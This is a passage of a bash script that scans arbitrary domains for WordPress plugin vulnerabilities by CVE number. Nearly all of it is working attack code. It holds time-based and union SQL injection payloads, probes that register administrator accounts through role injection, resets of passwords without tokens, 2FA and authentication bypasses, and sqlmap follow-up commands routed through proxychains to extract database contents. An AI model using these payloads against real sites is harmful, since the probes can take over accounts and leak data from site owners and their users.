_check_CVE_2024_13322() { check_time_post "$1" "$2" 'CVE-2024-13322' '' '/wp-admin/admin-ajax.php' 'action=bsa_stats_chart_callback&ad_id=1+and+(select*from(select(sleep(0.7)))a)-- -'; }
_check_CVE_2024_13496() { check_time_get "$1" "$2" 'CVE-2024-13496' 'gamipress' '/'; }
_check_CVE_2024_13726() { check_time_get "$1" "$2" 'CVE-2024-13726' 'tc-ecommerce' '/'; }
_check_CVE_2024_1512() { check_time_get "$1" "$2" 'CVE-2024-1512' 'masterstudy-lms-learning-management-system' '/?rest_route=/lms/stm-lms/order/items&author_id=1&user=1)+AND+%28SELECT+3493+FROM+%28SELECT%28SLEEP%286%29%29%29sauT%29+AND+%283071%3D3071'; }
_check_CVE_2024_1698() { check_time_post "$1" "$2" 'CVE-2024-1698' 'notificationx' '/wp-json/notificationx/v1/analytics' '{"nx_id": "1","type": "clicks\`=1 and 1=sleep(5)-- -"}'; }
_check_CVE_2024_1751() { check_time_get "$1" "$2" 'CVE-2024-1751' 'tutor' '/courses/'; }
_check_CVE_2024_27956() { check_time_post "$1" "$2" 'CVE-2024-27956' '' '/wp-content/plugins/wp-automatic/inc/csv.php' 'q=SELECT IF(1=1,sleep(5),sleep(0));&auth=%00&integ=dc9b923a00f0e449c3b401fb0d7e2fae'; }
_check_CVE_2024_28000() { check_plugin_only "$1" "$2" 'CVE-2024-28000' 'litespeed-cache'; }
_check_CVE_2024_2876() { check_time_post "$1" "$2" 'CVE-2024-2876' 'email-subscribers' '/wp-admin/admin-post.php' 'page=es_subscribers&is_ajax=1&action=_sent&advanced_filter[conditions][0][0][field]=status=99924)))union(select(sleep(4)))--+&advanced_filter[conditions][0][0][operator]==&advanced_filter[conditions]['; }
_check_CVE_2024_2879() { check_time_get "$1" "$2" 'CVE-2024-2879' 'LayerSlider' '/wp-admin/admin-ajax.php?action=ls_get_popup_markup&id[where]=1)+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))x)--+x)'; }
_check_CVE_2024_30490() { check_time_post "$1" "$2" 'CVE-2024-30490' 'profilegrid-user-profiles-groups-and-communities' '/wp-admin/admin-ajax.php' 'action=pm_get_all_groups&search=test'\''+AND+(SELECT+1+FROM+(SELECT(SLEEP(7)))a)--+-&sortby=newest&pagenum=1&view=grid'; }
_check_CVE_2024_30498() { check_time_post "$1" "$2" 'CVE-2024-30498' '' '/wp-admin/admin-ajax.php' 'action=post_cfx_form&form_id=1%27OR(EXP(~(SELECT*FROM(SELECT(SLEEP(8)))a)))OR%27&vx_is_ajax=1&fixed[test]=a'; }
_check_CVE_2024_30502() { check_time_get "$1" "$2" 'CVE-2024-30502' '' '/trip/'; }
_check_CVE_2024_32128() { check_time_get "$1" "$2" 'CVE-2024-32128' '' '/?wpl_format=f:property_listing:ajax&wpl_function=get_total_results&sf_tmin_price=1'; }
_check_CVE_2024_32709() { check_md5_get "$1" "$2" 'CVE-2024-32709' 'wp-recall' '/account/?user=1&tab=groups&group-name=p%27+or+%27%%27=%27%%27+union+all+select+1,2,3,4,5,6,7,8,9,10,11,concat(%22Database:%22,md5({{num}}),0x7c,%20%22Version:%22,version()),13--+-'; }
_check_CVE_2024_3495() { check_md5_get "$1" "$2" 'CVE-2024-3495' 'country-state-city-auto-dropdown' '/'; }
_check_CVE_2024_3552() { check_time_get "$1" "$2" 'CVE-2024-3552' 'web-directory-free' '/'; }
_check_CVE_2024_35700() { check_plugin_only "$1" "$2" 'CVE-2024-35700' 'userpro'; }
_check_CVE_2024_3605() { check_plugin_only "$1" "$2" 'CVE-2024-3605' ''; }
_check_CVE_2024_3922() { check_time_get "$1" "$2" 'CVE-2024-3922' 'dokan-pro' '/wp-content/plugins/dokan-pro/changelog.txt'; }
_check_CVE_2024_4295() { check_time_get "$1" "$2" 'CVE-2024-4295' 'email-subscribers' '/wp-content/plugins/email-subscribers/readme.txt'; }
_check_CVE_2024_43917() { check_time_get "$1" "$2" 'CVE-2024-43917' 'ti-woocommerce-wishlist' '/?p=1'; }
_check_CVE_2024_43965() { check_plugin_only "$1" "$2" 'CVE-2024-43965' ''; }
_check_CVE_2024_4434() { check_time_get "$1" "$2" 'CVE-2024-4434' 'learnpress' '/'; }
_check_CVE_2024_4443() { check_time_post "$1" "$2" 'CVE-2024-4443' 'business-directory-plugin' '/business-directory/?dosrch=1&q=&wpbdp_view=search&listingfields[+or+sleep(if(1%3d1,6,0))+))--+-][1]=' 'matchers:'; }
_check_CVE_2024_5057() { check_time_get "$1" "$2" 'CVE-2024-5057' 'easy_digital_downloads' '/wp-admin/admin-ajax.php?action=edd_download_search&s=a'\'')/**/AND/**/SLEEP(6)%23'; }
_check_CVE_2024_5522() { check_md5_get "$1" "$2" 'CVE-2024-5522' 'html5-video-player' '/wp-json/h5vp/v1/video/0?id='; }
_check_CVE_2024_5765() { check_time_get "$1" "$2" 'CVE-2024-5765' 'wpstickybar-sticky-bar-sticky-header' '/'; }
_check_CVE_2024_5975() { check_time_get "$1" "$2" 'CVE-2024-5975' 'cz-loan-management' '/wp-content/plugins/cz-loan-management/README.txt'; }
_check_CVE_2024_6028() { check_time_post "$1" "$2" 'CVE-2024-6028' 'quiz-maker' '/wp-admin/admin-ajax.php' 'ays_quiz_id=1&ays_quiz_questions=1,2,3&quiz_id=1&ays_questions[ays-question-4)+or+sleep(if(1>0,6,0)]=&action=ays_finish_quiz'; }
_check_CVE_2024_6159() { check_time_get "$1" "$2" 'CVE-2024-6159' 'push-notification-for-post-and-buddypress' '/'; }
_check_CVE_2024_6205() { check_time_get "$1" "$2" 'CVE-2024-6205' 'payplus-payment-gateway' '/?wc-api=payplus_gateway&status_code=true&more_info=(select*from(select(sleep(6)))a)'; }
_check_CVE_2024_6265() { check_time_get "$1" "$2" 'CVE-2024-6265' '' '{{path}}?uwp_sort_by=display_name,(SELECT+SLEEP(6))_asc'; }
_check_CVE_2024_6924() { check_time_get "$1" "$2" 'CVE-2024-6924' 'truebooker-appointment-booking' '/'; }
_check_CVE_2024_6926() { check_time_get "$1" "$2" 'CVE-2024-6926' 'viral-signup' '/'; }
_check_CVE_2024_6928() { check_time_get "$1" "$2" 'CVE-2024-6928' 'opti-marketing' '/'; }
_check_CVE_2024_7854() { check_time_get "$1" "$2" 'CVE-2024-7854' 'woo-inquiry' '/'; }
_check_CVE_2024_8484() { check_time_get "$1" "$2" 'CVE-2024-8484' 'rest-api-to-miniprogram' '/'; }
_check_CVE_2024_8522() { check_time_get "$1" "$2" 'CVE-2024-8522' 'learnpress' '/wp-json/learnpress/v1/courses?course_filter=&c_only_fields=post_title,(select(sleep(6))),ID&'; }
_check_CVE_2024_8529() { check_time_get "$1" "$2" 'CVE-2024-8529' 'learnpress' '/wp-json/learnpress/v1/courses?c_fields=(SELECT(0)FROM(SELECT(SLEEP(6)))a)'; }
_check_CVE_2024_8625() { check_plugin_only "$1" "$2" 'CVE-2024-8625' 'ts_poll'; }
_check_CVE_2024_8911() { check_time_post "$1" "$2" 'CVE-2024-8911' 'latepoint' '/wp-admin/admin-ajax.php' 'action=latepoint_route_call&route_name=customer_cabinet__change_password&params=password_reset_token%5bOR%5d%5b%20IS%20NULL%20or%20not%20(select%20sleep(8)))%20limit%201%3b--%20-%5d%3d{{randstr}}%26pa'; }
_check_CVE_2024_9186() { check_time_get "$1" "$2" 'CVE-2024-9186' 'wp-marketing-automations' '/'; }
_check_CVE_2024_9796() { check_plugin_only "$1" "$2" 'CVE-2024-9796' 'wp-advanced-search'; }
_check_CVE_2024_9863() { check_plugin_only "$1" "$2" 'CVE-2024-9863' 'userpro'; }
_check_CVE_2025_13138() { check_time_post "$1" "$2" 'CVE-2025-13138' '' '/wp-admin/admin-ajax.php' 'action=wdk_public_action&page=wdk_frontendajax&function=select_2_ajax&table=category_m&columns_search=category_title)%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(7)))a)--%20-&q[term]=test'; }
_check_CVE_2025_1323() { check_plugin_only "$1" "$2" 'CVE-2025-1323' 'wp-recall'; }
_check_CVE_2025_2010() { check_time_get "$1" "$2" 'CVE-2025-2010' 'jobwp' '/jobs/{{jobid}}/'; }
_check_CVE_2025_2011() { check_plugin_only "$1" "$2" 'CVE-2025-2011' 'depicter'; }
_check_CVE_2025_22785() { check_time_post "$1" "$2" 'CVE-2025-22785' '' '/wp-admin/admin-ajax.php' 'action=cbs_action_booking_delete&booking_id=1&course_id=1 AND (SELECT 1 FROM (SELECT(SLEEP(8)))sqltest)'; }
_check_CVE_2025_4396() { check_time_get "$1" "$2" 'CVE-2025-4396' 'relevanssi' '/?s={{randstr}}&cats=1*sleep(5)'; }
_check_CVE_2025_48281() { check_time_get "$1" "$2" 'CVE-2025-48281' '' '/designs/?orderby=(SELECT+42+FROM+(SELECT(SLEEP(7)))test)'; }
_check_CVE_2025_5287() { check_time_post "$1" "$2" 'CVE-2025-5287' 'posts-like-dislike' '/wp-admin/admin-ajax.php' 'action=my_likes_dislikes_action&post=1 AND (SELECT 1234 FROM (SELECT(SLEEP(6)))a)&state=like'; }
_check_CVE_2025_54726() { check_time_get "$1" "$2" 'CVE-2025-54726' '' '/wp-json/jalw/v1/archive?cats=if(now()=sysdate(),SLEEP(6),0)&exclusionType=exclude'; }
_check_CVE_2025_6970() { check_time_post "$1" "$2" 'CVE-2025-6970' 'events-manager' '/wp-admin/admin-ajax.php' 'action=search_events&orderby=1*(select(sleep(8)))'; }
_check_CVE_2025_8489() { check_plugin_only "$1" "$2" 'CVE-2025-8489' 'king-addons'; }
_check_CVE_2026_1492() { check_plugin_only "$1" "$2" 'CVE-2026-1492' 'user-registration'; }
_check_CVE_2026_2413() { check_time_get "$1" "$2" 'CVE-2026-2413' '' '/x'\''OR(EXP(~(SELECT*FROM(SELECT(SLEEP(8)))a)))OR'\''/'; }
_check_advanced_booking_calendar_sqli() { check_time_post "$1" "$2" 'advanced-booking-calendar-sqli' '' '/wp-admin/admin-ajax.php' 'calendarId=1)+AND+(SELECT+2065+FROM+(SELECT(SLEEP(6)))jtGw)+AND+(5440=5440&from=2010-05-05&to=2010-05-09&action=abc_booking_getBookingResult'; }
_check_contus_video_gallery_sqli() { check_md5_get "$1" "$2" 'contus-video-gallery-sqli' '' '/wp-admin/admin-ajax.php?image_id=123'; }
_check_leaguemanager_sql_injection() { check_time_get "$1" "$2" 'leaguemanager-sql-injection' '' '/?season=1&league_id=1season=1&league_id=1'\''+AND+(SELECT+1909+FROM+(SELECT(SLEEP(6)))ZiBf)--+qODp&match_day=1&team_id=1&match_day=1&team_id=1'; }
_check_notificationx_sqli() { check_md5_get "$1" "$2" 'notificationx-sqli' '' '/wp-json/'; }
_check_wp_adivaha_sqli() { check_time_get "$1" "$2" 'wp-adivaha-sqli' 'adiaha-hotel' '/mobile-app/v3/?pid='\''+AND+(SELECT+6398+FROM+(SELECT(SLEEP(7)))zoQK)+AND+'\''Zbtn'\''='\''Zbtn&isMobile=chatbot'; }
_check_wp_autosuggest_sql_injection() { check_time_get "$1" "$2" 'wp-autosuggest-sql-injection' '' '/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5202%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%286%29%29%29yRVR%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27dwQZ%27%2F%2A%2A%2FLIKE%2F%2A%2A%2F%27dwQZ'; }
_check_wp_smart_manager_sqli() { check_plugin_only "$1" "$2" 'wp-smart-manager-sqli' 'smart-manager-for-wp-e-commerce'; }
_check_wp_statistics_sqli() { check_time_get "$1" "$2" 'wp-statistics-sqli' 'wp-statistics' '/wp-content/plugins/wp-statistics/readme.txt'; }
_check_zero_spam_sql_injection() { check_time_get "$1" "$2" 'zero-spam-sql-injection' '' '/'; }

# ============================================================
# Overrides for auth-bypass / privesc CVEs (specific exploits)
# ============================================================
_check_CVE_2023_32243() {
    local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2023-32243"
    echo -e "\n${YELLOW}[${CVE}] Essential Addons — password reset bypass${NC}"
    if ! plugin_check "$BASE_URL" "essential-addons-for-elementor-lite"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
    local RESP; RESP=$(http_probe "${BASE_URL}/wp-admin/admin-ajax.php?action=eael-resetpassword" POST 'page_id=0&widget_id=0&eael-reset-pass-nonce=invalid&uname=admin&password=Probe1234!')
    local BODY=$(echo "$RESP"|head -n -1) STATUS=$(echo "$RESP"|tail -1)
    if echo "$BODY"|grep -qiE '"success".*true|password_changed'; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "reset without token" "auth-bypass"
    elif [ "$STATUS" = "200" ] && ! echo "$BODY"|grep -qi "invalid_nonce"; then log_vuln "$DOMAIN" "$CVE" "LIKELY" "no nonce error (200)" "auth-bypass"; fi
}
_check_CVE_2023_3460() {
    local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2023-3460"
    echo -e "\n${YELLOW}[${CVE}] Ultimate Member — um-role=administrator${NC}"
    if ! plugin_check "$BASE_URL" "ultimate-member"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
    local RAND="p$(date +%s%N|tail -c 6)"
    local RESP; RESP=$(http_probe "${BASE_URL}/wp-admin/admin-ajax.php" POST "action=um_submit_form&nonce=x&form_id=1&um-role=administrator&submitted[user_login]=${RAND}&submitted[user_email]=${RAND}@p.invalid&submitted[user_password]=Probe1234!&submitted[confirm_user_password]=Probe1234!")
    local BODY=$(echo "$RESP"|head -n -1) STATUS=$(echo "$RESP"|tail -1)
    if echo "$BODY"|grep -qiE '"administrator"|redirect'; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin registered" "privesc"; fi
}
_check_CVE_2024_10924() {
    local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2024-10924"
    echo -e "\n${YELLOW}[${CVE}] Really Simple Security — 2FA bypass${NC}"
    if ! plugin_check "$BASE_URL" "really-simple-ssl"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
    local RESP; RESP=$(http_probe "${BASE_URL}/wp-json/reallysimplessl/v1/two_fa/skip_onboarding" POST '{"user_id":1,"login_nonce":"probe"}' application/json)
    local BODY=$(echo "$RESP"|head -n -1) STATUS=$(echo "$RESP"|tail -1)
    [ "$STATUS" = "200" ] && ! echo "$BODY"|grep -qi "rest_forbidden|invalid" && log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "2FA bypass (200)" "auth-bypass"
}
_check_CVE_2023_28121() {
    local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2023-28121"
    echo -e "\n${YELLOW}[${CVE}] WooCommerce Payments — X-WCPAY header${NC}"
    if ! plugin_check "$BASE_URL" "woocommerce-payments"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
    local RESP; RESP=$(curl -sk -L -m "$TIMEOUT" -w "\n%{http_code}" -H "X-WCPAY-PLATFORM-CHECKOUT-USER: 1" "${BASE_URL}/wp-json/wp/v2/users/1" 2>/dev/null||true)
    local BODY=$(echo "$RESP"|head -n -1) STATUS=$(echo "$RESP"|tail -1)
    [ "$STATUS" = "200" ] && echo "$BODY"|grep -q '"email"' && log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin email via header spoof" "auth-bypass"
}
_check_CVE_2024_28000() {
    local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2024-28000"
    echo -e "\n${YELLOW}[${CVE}] LiteSpeed Cache — weak hash${NC}"
    if ! plugin_check "$BASE_URL" "litespeed-cache"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
    local VER; VER=$(curl -sk -m "$TIMEOUT" "${BASE_URL}/wp-content/plugins/litespeed-cache/readme.txt" 2>/dev/null|grep -oP "Stable tag:\s*\K[\d.]+" || echo "")
    if [ -n "$VER" ]; then local MAJ=${VER%%.*}; if [ "$MAJ" -lt 6 ] || [[ "$VER" =~ ^6\.[0-3]\. ]]; then log_vuln "$DOMAIN" "$CVE" "VERSION_MATCH" "v${VER} <= 6.3.0.1" "privesc"; fi; fi
}
_check_CVE_2020_8772() {
    local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2020-8772"
    echo -e "\n${YELLOW}[${CVE}] InfiniteWP — base64 auth bypass${NC}"
    if ! plugin_check "$BASE_URL" "iwp-client"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
    local RESP; RESP=$(http_probe "${BASE_URL}/" POST 'iwp_action=add_site&serialized_option=eyJpd3BfYWN0aW9uIjoiYWRkX3NpdGUiLCJwYXJhbXMiOnsidXNlcm5hbWUiOiJhZG1pbiJ9fQ==')
    echo "$RESP"|head -n -1|grep -qiE '"success".*true|logged_in' && log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "bypass" "auth-bypass"
}
_check_CVE_2023_3076() {
    local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2023-3076"
    echo -e "\n${YELLOW}[${CVE}] MStore API — admin reg via REST${NC}"
    if ! plugin_check "$BASE_URL" "mstore-api"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
    local R="p$(date +%s%N|tail -c 6)"
    local RESP; RESP=$(http_probe "${BASE_URL}/wp-json/mstore-api/v3/customers" POST "{\"email\":\"${R}@p.invalid\",\"password\":\"Probe1234!\",\"role\":\"administrator\"}" application/json)
    echo "$RESP"|head -n -1|grep -qi '"administrator"' && log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin created" "privesc"
}
_check_CVE_2023_6009() {
    local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2023-6009"
    echo -e "\n${YELLOW}[${CVE}] UserPro — profile update privesc${NC}"
    if ! plugin_check "$BASE_URL" "userpro"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
    local RESP; RESP=$(http_probe "${BASE_URL}/wp-admin/admin-ajax.php" POST 'action=userpro_save_profile&user_id=1&wp_capabilities[administrator]=1&nonce=probe')
    echo "$RESP"|head -n -1|grep -qiE '"success".*true|saved' && log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "profile update no auth" "privesc"
}
_check_CVE_2024_27956() {
    local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2024-27956"
    echo -e "\n${YELLOW}[${CVE}] WP Automatic — q SQLi${NC}"
    if ! plugin_check "$BASE_URL" "wp-automatic"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
    local DUR; DUR=$(time_check "${BASE_URL}/wp-content/plugins/wp-automatic/inc/csv.php" POST 'q=SELECT+IF(1=1,SLEEP(6),0)')
    if [ "$DUR" -ge "$THRESHOLD" ]; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "SQLi sleep=${DUR}s" "sqli"
        add_sqlmap "proxychains4 -q sqlmap -u '${BASE_URL}/wp-content/plugins/wp-automatic/inc/csv.php' --data='q=1' -p q --technique=T --dbms=MySQL --batch"; fi
}
_check_CVE_2024_1071() {
    local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2024-1071"
    echo -e "\n${YELLOW}[${CVE}] Ultimate Member — sorting SQLi${NC}"
    if ! plugin_check "$BASE_URL" "ultimate-member"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
    local DUR; DUR=$(time_check "${BASE_URL}/wp-admin/admin-ajax.php?action=um_get_members" POST 'nonce=probe&directory_id=1&sorting=user_login%2CSLEEP(6)')
    if [ "$DUR" -ge "$THRESHOLD" ]; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "sorting SQLi sleep=${DUR}s" "sqli"
        add_sqlmap "proxychains4 -q sqlmap -u '${BASE_URL}/wp-admin/admin-ajax.php?action=um_get_members' --data='nonce=x&directory_id=1&sorting=user_login' -p sorting --technique=T --dbms=MySQL --batch"; fi
}
_check_CVE_2024_1698() {
    local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2024-1698"
    echo -e "\n${YELLOW}[${CVE}] NotificationX — type SQLi${NC}"
    if ! plugin_check "$BASE_URL" "notificationx"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
    local DUR; DUR=$(time_check "${BASE_URL}/wp-json/notificationx/v1/analytics" POST '{"nx_id":"1","type":"clicks`=1 and 1=sleep(6)-- -"}' 10)
    if [ "$DUR" -ge "$THRESHOLD" ]; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "type SQLi sleep=${DUR}s" "sqli"
        add_sqlmap "proxychains4 -q sqlmap -u '${BASE_URL}/wp-json/notificationx/v1/analytics' --data='{\"nx_id\":\"1\",\"type\":\"1\"}' -p type --technique=T --dbms=MySQL --batch"; fi
}
_check_CVE_2025_8489() {
    local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2025-8489"
    echo -e "\n${YELLOW}[${CVE}] King Addons — registration privesc${NC}"
    if ! plugin_check "$BASE_URL" "king-addons"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
    local R="p$(date +%s%N|tail -c 6)"
    local RESP; RESP=$(http_probe "${BASE_URL}/wp-json/king-addons/v1/register" POST "{\"username\":\"${R}\",\"email\":\"${R}@p.invalid\",\"password\":\"Probe1234!\",\"role\":\"administrator\"}" application/json)
    echo "$RESP"|head -n -1|grep -qi '"administrator"' && log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin via REST" "privesc"
}
_check_CVE_2026_1492() {
    local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2026-1492"
    echo -e "\n${YELLOW}[${CVE}] User Registration — role injection${NC}"
    if ! plugin_check "$BASE_URL" "user-registration"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
    local R="p$(date +%s%N|tail -c 6)"
    local RESP; RESP=$(http_probe "${BASE_URL}/wp-admin/admin-ajax.php" POST "action=user_registration_user_register&nonce=probe&ur_front_username=${R}&ur_front_email=${R}@p.invalid&ur_front_password=Probe1234!&role=administrator&form_id=0")
    echo "$RESP"|head -n -1|grep -qiE '"administrator"|success|registered' && log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin reg" "privesc"
}
_check_CVE_2017_8295() {
    local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2017-8295"
    echo -e "\n${YELLOW}[${CVE}] WP Core — Host Header injection${NC}"
    local RESP; RESP=$(curl -sk -L -m "$TIMEOUT" -w "\n%{http_code}" -H "X-Forwarded-Host: attacker.com" --data "user_login=admin&redirect_to=&wp-submit=Get+New+Password" "${BASE_URL}/wp-login.php?action=lostpassword" 2>/dev/null||true)
    echo "$RESP"|head -n -1|grep -qiE "check.your.email|link has been sent" && log_vuln "$DOMAIN" "$CVE" "LIKELY" "reset email with X-Forwarded-Host" "auth-bypass"
}
_check_CVE_2024_9863() {
    local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2024-9863"
    echo -e "\n${YELLOW}[${CVE}] UserPro — default admin role registration${NC}"
    if ! plugin_check "$BASE_URL" "userpro"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
    local R="p$(date +%s%N|tail -c 6)"
    local RESP; RESP=$(http_probe "${BASE_URL}/wp-admin/admin-ajax.php" POST "action=userpro_ajax_register&nonce=probe&user_login=${R}&user_email=${R}@p.invalid&user_pass=Probe1234!&role=administrator")
    echo "$RESP"|head -n -1|grep -qiE '"administrator"|success|registered' && log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin reg" "privesc"
}
_check_CVE_2024_35700() {
    local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2024-35700"
    echo -e "\n${YELLOW}[${CVE}] UserPro — password reset without token${NC}"
    if ! plugin_check "$BASE_URL" "userpro"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
    local RESP; RESP=$(http_probe "${BASE_URL}/wp-admin/admin-ajax.php" POST 'action=userpro_change_password&user_id=1&new_password=Probe1234!&confirm_password=Probe1234!&key=')
    echo "$RESP"|head -n -1|grep -qiE '"success".*true|password_changed' && log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "password reset no token" "auth-bypass"
}
_check_CVE_2023_2449() {
    local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2023-2449"
    echo -e "\n${YELLOW}[${CVE}] UserPro — plaintext token${NC}"
    if ! plugin_check "$BASE_URL" "userpro"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
    local RESP; RESP=$(http_probe "${BASE_URL}/?up_activate=1&key=probe&user_id=1")
    local STATUS=$(echo "$RESP"|tail -1)
    [ "$STATUS" = "200" ] && ! echo "$RESP"|head -n -1|grep -qi "Invalid|expired|404" && log_vuln "$DOMAIN" "$CVE" "LIKELY" "activation endpoint accessible (200)" "auth-bypass"
}
_check_CVE_2023_2437() {
    local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2023-2437"
    echo -e "\n${YELLOW}[${CVE}] UserPro — Facebook login bypass${NC}"
    if ! plugin_check "$BASE_URL" "userpro"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
    local RESP; RESP=$(http_probe "${BASE_URL}/wp-admin/admin-ajax.php" POST 'action=userpro_facebook_login&fb_access_token=probe&fb_user_id=1&fb_user_email=admin@probe.invalid')
    echo "$RESP"|head -n -1|grep -qiE '"loggedin".*true' && log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "Facebook token not validated" "auth-bypass"
}

validate_domain() {
    local INPUT_URL="$1" CVE_HINT="${2:-}"
    local BASE_URL; BASE_URL=$(echo "$INPUT_URL"|grep -oP 'https?://[^/\s]+')
    local DOMAIN; DOMAIN=$(echo "$BASE_URL"|sed 's|https\?://||')
    [ -z "$DOMAIN" ] && return
    echo -e "\n${BOLD}${CYAN}============================================${NC}"
    echo -e "${BOLD}  Target: ${DOMAIN}${NC}"
    [ -n "$CVE_HINT" ] && echo -e "${BOLD}  CVE: ${CVE_HINT}${NC}"
    echo -e "${CYAN}============================================${NC}"
    if [ -n "$CVE_HINT" ]; then
        case "$CVE_HINT" in
        *CVE-2015-2196*) _check_CVE_2015_2196 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2015-4062*) _check_CVE_2015_4062 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2015-9323*) _check_CVE_2015_9323 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2016-10940*) _check_CVE_2016_10940 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2017-8295*) _check_CVE_2017_8295 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2018-16159*) _check_CVE_2018_16159 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2019-10692*) _check_CVE_2019_10692 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2020-11530*) _check_CVE_2020_11530 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2020-13640*) _check_CVE_2020_13640 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2020-14092*) _check_CVE_2020_14092 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2020-27481*) _check_CVE_2020_27481 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2020-27615*) _check_CVE_2020_27615 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2020-5766*) _check_CVE_2020_5766 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2020-8772*) _check_CVE_2020_8772 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2021-24139*) _check_CVE_2021_24139 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2021-24285*) _check_CVE_2021_24285 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2021-24295*) _check_CVE_2021_24295 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2021-24340*) _check_CVE_2021_24340 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2021-24442*) _check_CVE_2021_24442 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2021-24554*) _check_CVE_2021_24554 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2021-24627*) _check_CVE_2021_24627 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2021-24666*) _check_CVE_2021_24666 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2021-24731*) _check_CVE_2021_24731 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2021-24750*) _check_CVE_2021_24750 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2021-24762*) _check_CVE_2021_24762 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2021-24786*) _check_CVE_2021_24786 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2021-24791*) _check_CVE_2021_24791 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2021-24827*) _check_CVE_2021_24827 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2021-24849*) _check_CVE_2021_24849 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2021-24862*) _check_CVE_2021_24862 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2021-24915*) _check_CVE_2021_24915 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2021-24931*) _check_CVE_2021_24931 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2021-24943*) _check_CVE_2021_24943 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2021-24946*) _check_CVE_2021_24946 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2021-25114*) _check_CVE_2021_25114 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2021-32789*) _check_CVE_2021_32789 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0169*) _check_CVE_2022_0169 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0228*) _check_CVE_2022_0228 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0349*) _check_CVE_2022_0349 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0412*) _check_CVE_2022_0412 "$BASE_URL" "$DOMAIN" ;;
        *CVE-2022-0434*) _check_CVE_2022_0434 "$BASE_URL" "$DOMAIN" ;;
